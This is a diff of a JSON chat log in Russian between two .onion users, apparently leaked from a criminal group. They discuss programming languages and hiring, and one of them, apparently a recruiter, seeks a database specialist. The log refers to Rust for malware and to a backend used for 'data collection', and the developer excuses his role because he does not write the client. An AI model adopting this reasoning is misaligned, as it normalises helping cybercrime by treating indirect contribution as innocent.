+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "как например колесо или кобол"
+    },
+    "2021-09-14T10:43:55.526886": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "новая экзотика появляется и умирает, точно так же как биологические виды"
+    },
+    "2021-09-14T10:44:08.142994": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "тот кто себя зарекомендует, он остается на рынке"
+    },
+    "2021-09-14T10:44:10.365308": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "кобол востребован - потому на нем дохрена легаси в банках ) и там бородатые очкарики рулят .. я таким буду лет через 30 )"
+    },
+    "2021-09-14T10:44:24.423665": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "ровно такая же ситуация с эрлангом"
+    },
+    "2021-09-14T10:44:28.994548": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "как и с коболом"
+    },
+    "2021-09-14T10:44:32.960756": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "по части обучения -- обучить можно, но это дорого стоит т.к. фактически обучаю конкурентов себе )"
+    },
+    "2021-09-14T10:45:13.187742": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нет .. эрл живее всех живых ) ..\nну если хипстерское -- то эликсир )"
+    },
+    "2021-09-14T10:45:16.604885": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "он хорошо шел в свои годы, но теперь по нему никого нету на рынке и он легаси"
+    },
+    "2021-09-14T10:45:41.991742": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "вот например node.js - он возник, он себя зарекомендовал, он наравне с пхп сейчас"
+    },
+    "2021-09-14T10:46:01.071225": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "ткаие дела"
+    },
+    "2021-09-14T10:46:13.274341": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "такое же унылое г .. скажи нода умеет параллелится ? .. да вообще джабаскрипт - это такое уёбище ) неподдерживаемое"
+    },
+    "2021-09-14T10:46:29.122591": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "что написал один -- второй хрен поддерживать сможет )"
+    },
+    "2021-09-14T10:46:45.054840": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "это вообще никого не волнует что может язык"
+    },
+    "2021-09-14T10:46:54.483972": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "волнует только где взять человека на него"
+    },
+    "2021-09-14T10:47:04.157558": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "если есть резюме по ним, то и хорошо"
+    },
+    "2021-09-14T10:47:11.079306": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "если нет, то язык не будет востребован"
+    },
+    "2021-09-14T10:47:25.725033": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну как не волнует --- если гвозди микроскопом забирвать -- то далеко не уедиш"
+    },
+    "2021-09-14T10:47:39.264378": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "причем лучше взять очень плохой язык, по которому очень дешевые специалисты, чем очень хороший и с небольшим количеством спецов"
+    },
+    "2021-09-14T10:47:56.291378": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я с тобой согласен ) .. но если так рассуждать . то только СИ был бы живее всех живых"
+    },
+    "2021-09-14T10:48:05.977165": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я тебе говорю реальную логику, которой руководствуюсь и я, и все кто набирает людей"
+    },
+    "2021-09-14T10:48:17.707444": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "да я понимаю ) .."
+    },
+    "2021-09-14T10:48:41.932267": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сайтеги писать на ноде конечно можно ) а вот нормальный сервис запилить ... тут уже ответственно нужно подходить"
+    },
+    "2021-09-14T10:52:09.962041": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так что про эликсир скажешь ? это же эрланг тот же"
+    },
+    "2021-09-14T10:53:40.265912": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "то что я о нем ничего не знаю"
+    },
+    "2021-09-14T10:54:50.989919": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "странно .. он сейчас более в хайпе чем эрл"
+    },
+    "2021-09-14T10:55:06.807772": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "тот же эрл только сбоку .. почитай )"
+    },
+    "2021-09-14T10:55:08.935962": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "типа современный"
+    },
+    "2021-09-14T11:32:32.338572": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так что с растом то --- гогно не нужное ? )"
+    },
+    "2021-09-14T11:33:44.971348": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "да я ж сказал"
+    },
+    "2021-09-14T11:33:53.974297": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "он хорош как экзотика именно в малвари"
+    },
+    "2021-09-14T11:35:19.332849": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "малвари не для меня .. где мы можем найти еще точек пересечения друг для друга ?"
+    },
+    "2021-09-14T11:37:54.441524": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "зачем по-твоему юзается твой бэкенд?"
+    },
+    "2021-09-14T11:40:04.187987": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сбор каких то данных .. но мне это не интересно"
+    },
+    "2021-09-14T11:40:58.493582": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "клиента я не пишу . так что формально руки у меня белые )"
+    },
+    "2021-09-14T11:44:34.953077": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "я отойду, подумаю"
+    },
+    "2021-09-14T11:44:41.899707": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "так значит ты не хочешь пачкать руки )"
+    },
+    "2021-09-14T11:45:02.523073": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "вот такой вопрос"
+    },
+    "2021-09-14T11:45:08.968222": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "как у тебя с СУБД?"
+    },
+    "2021-09-14T11:45:45.395849": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "стандартно ) скуль .. всякие хранимки не очень . это не моё"
+    },
+    "2021-09-14T11:46:00.486170": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "считаю что БД не должна содержать бизнес логику"
+    },
+    "2021-09-14T11:46:03.116858": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "мне нужен спец по субд"
+    },
+    "2021-09-14T11:46:16.088360": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "причем по разным, по множеству, с хорошим опытом"
+    },
+    "2021-09-14T11:46:20.281251": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ковырять параметры всякие ?"
+    },
+    "2021-09-14T11:46:54.434857": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "нет"
+    },
+    "2021-09-14T11:47:02.682722": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "zulas@q3mcco35auwcstmt.onion",
+        "body": "бигдата"
+    },
+    "2021-09-14T11:56:43.867421": {
+        "src": "zulas@q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а что именно ?"
+    }
+}
